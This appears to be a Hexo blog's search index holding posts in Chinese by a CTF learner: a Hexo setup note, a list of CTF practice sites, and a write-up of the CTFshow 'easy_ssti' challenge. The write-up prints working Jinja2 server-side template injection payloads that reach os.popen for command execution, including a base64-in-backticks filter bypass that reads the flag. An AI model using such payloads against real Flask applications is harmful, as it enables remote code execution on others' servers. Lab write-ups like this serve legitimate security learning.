<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CTFSHOW愚人杯easy_ssti</title>
    <link href="/2023/04/02/problem1/"/>
    <url>/2023/04/02/problem1/</url>
    
    <content type="html"><![CDATA[<p>​本文记录自己的第一次SSTI成功案例。(很菜，轻喷😭)</p><p>打开靶机后没有看到有用的提示，看一下源码。</p><p>发现有一个压缩包，下载下来看看。</p><p>是flask的模板，分析一下源码应该就是在&#x2F;hello目录下有SSTI注入的漏洞。</p><p>进入hello目录下并照常走一下判断流程，发现应该是jinja2的模板。</p><p>放张老图</p><p>找一下object</p><p>再看看有什么类能用的</p><p><a href="https://blog.csdn.net/weixin_58624515/article/details/127991339">这边参考了一位大佬的博客</a></p><p>找catch_warnings，因为catch_warning是function具有__globals__</p><p>然后再通过__globals__里的builtins的__import__来getshell</p><p>os库中可以调用popen函数执行命令，再read读取到页面上。</p><p>在页面上查catch_warning的位置，再查class的位置就能大概查到是第几个类了。</p><p>用ls查了一下当前目录，app.py 里也没啥有用信息，和压缩包里是一样的。</p><p>接下来看看templates</p><p>发现也是没什么东西。</p><p>那就直接根目录查flag吧。</p>{{''.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /f*').read()}}<p>发现not found了</p><p>猜测了一下，应该是将语句中的”&#x2F;“当成目录了。</p><p>那就试试base64+管道符绕过</p><p>“cat &#x2F;f*”&#x3D;&#x3D;”Y2F0IC9mKg&#x3D;&#x3D;”</p>{{''.__class__.__bases__[0].__subclasses__()[213].__init__.__globals__['__builtins__']['__import__']('os').popen('`echo Y2F0IC9mKg== | base64 -d`').read()}}<p>成功拿到flag。</p><p>注意要包一层反引号（命令执行），不然会被当做字符串echo出来。</p><p>另外这道题刚开始的源码那块对”f”和”ge”进行了处理，我不知道在其他思路里会不会卡住，我试了下可以在语句的最后直接加上”ge”绕过。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTI</title>
    <link href="/2023/03/27/SSTI/"/>
    <url>/2023/03/27/SSTI/</url>
    
    <content type="html"><![CDATA[<p>本文记录自己SSTI的学习过程（本人为CTF菜鸡，如有错误还请指正）</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>No Title!Just a picture!😛</title>
    <link href="/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/"/>
    <url>/2023/01/20/No%20Title!Just%20a%20picture!%F0%9F%98%9B/</url>
    
    <content type="html"><![CDATA[<p><img src="/img%5Cpic1.jpg" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>博客搭建(主要是怕自己忘记咋弄了)</title>
    <link href="/2023/01/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E4%B8%BB%E8%A6%81%E6%98%AF%E6%80%95%E8%87%AA%E5%B7%B1%E5%BF%98%E8%AE%B0%E5%92%8B%E5%BC%84%E4%BA%86)/"/>
    <url>/2023/01/20/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA(%E4%B8%BB%E8%A6%81%E6%98%AF%E6%80%95%E8%87%AA%E5%B7%B1%E5%BF%98%E8%AE%B0%E5%92%8B%E5%BC%84%E4%BA%86)/</url>
    
    <content type="html"><![CDATA[<p>网站本地启动</p><p>cd hexo-blog</p><p>hexo g </p><p>hexo server</p><p>博客hexo根目录在D:&#x2F;blog</p><p>先修改完博文内容</p><p>👇更新本地hexo配置</p><p>先hexo g</p><p>再hexo d</p><p>配置完后准备发布到GitHub👇</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">hexo clean<br>hexo generate<br>(若要本地预览就先执行 hexo server)<br>hexo deploy<br></code></pre></td></tr></table></figure><p>git config –global http.sslVerify “true”</p><p>👆个人解决方案</p><p>按照网上的false并不能使用，更改为true后惊讶地发现可以使用</p><p>另外还要到设置中修改域名（每次博客更新都需要修改域名，每次更新设置的域名都会重置）</p><p>参考文章：</p><p><a href="https://www.jianshu.com/p/23b9e095c7c9">为你的hexo博客配置个性域名 - 简书 (jianshu.com)</a></p><p><a href="https://blog.csdn.net/ten_sory/article/details/81359421?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1-81359421-blog-120295287.pc_relevant_multi_platform_whitelistv2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1-81359421-blog-120295287.pc_relevant_multi_platform_whitelistv2&utm_relevant_index=2">(8条消息) Hexo+github博客搭建与自定义域名_梦想总是要不可及，是不是应该放弃的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/bbsyi/article/details/119101852">(8条消息) GitHub Pages + Hexo搭建个人博客网站，史上最全教程_弹琴弹琴的博客-CSDN博客_githubpages hexo</a></p><p><a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>主要是怕自己忘记咋弄了,只记录了一些自己可能忘了的东西</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF网站收录</title>
    <link href="/2022/07/03/Welcome-to-my-blog/"/>
    <url>/2022/07/03/Welcome-to-my-blog/</url>
    
    <content type="html"><![CDATA[<p>比较系统的学习路线：<br><a href="https://ctf-wiki.org/">https://ctf-wiki.org/</a><br>刷题网站：<br><a href="https://buuoj.cn/">https://buuoj.cn/</a><br><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a><br><a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br><a href="https://ctf.show/">https://ctf.show/</a><br><a href="http://www.zxsctf.com/">http://www.zxsctf.com/</a><br><a href="https://pwnable.tw/">https://pwnable.tw/</a>(pwn)<br><a href="https://microcorruption.com/">https://microcorruption.com/</a>(iot&amp;&amp;reverse&amp;&amp;pwn)<br>比赛资讯：<br><a href="https://www.ctfhub.com/#/calendar">https://www.ctfhub.com/#/calendar</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>用sticky置顶了哦</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Welcome to Ec0y&#39;s Blog</title>
    <link href="/2022/07/03/Blog/"/>
    <url>/2022/07/03/Blog/</url>
    
    <content type="html"><![CDATA[<img src="/2022/07/03/Blog/bg2.jpg" srcset="/img/loading.gif" lazyload class title="This is an example image">]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
